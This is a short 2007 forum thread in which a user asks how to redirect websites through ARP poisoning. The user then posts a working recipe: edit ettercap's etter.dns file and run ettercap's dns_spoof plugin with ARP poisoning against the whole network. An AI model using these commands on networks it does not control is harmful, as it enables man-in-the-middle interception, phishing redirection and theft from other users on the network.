---
title: "Filtering pages with ettercap"
date: 2007-02-23
forum: Networking &amp; Wireless
---

### Post by HIGHLIFE on 2007-02-23
Hey guys I was wondering if there was an easy way to filter web pages through ARP poisoning such that I could redirect certian sites to my webpage, or if anyone had a ettercap filter file that would do this?


P.S. I am using this on my network and not to cause harm.

---

### Post by HIGHLIFE on 2007-02-24
Alright I found that by editing the etter.dns config, and running ettercap with the dns_spoof plugin I was able to achieve the same effect.

Edit the etter.dns:
```
sudo gedit /usr/share/ettercap/etter.dns
```
Add the sites you want filtered

I then ran: 
```
sudo ettercap -T -P dns_spoof -M ARP // //
``` 
to spoof my whole network

---

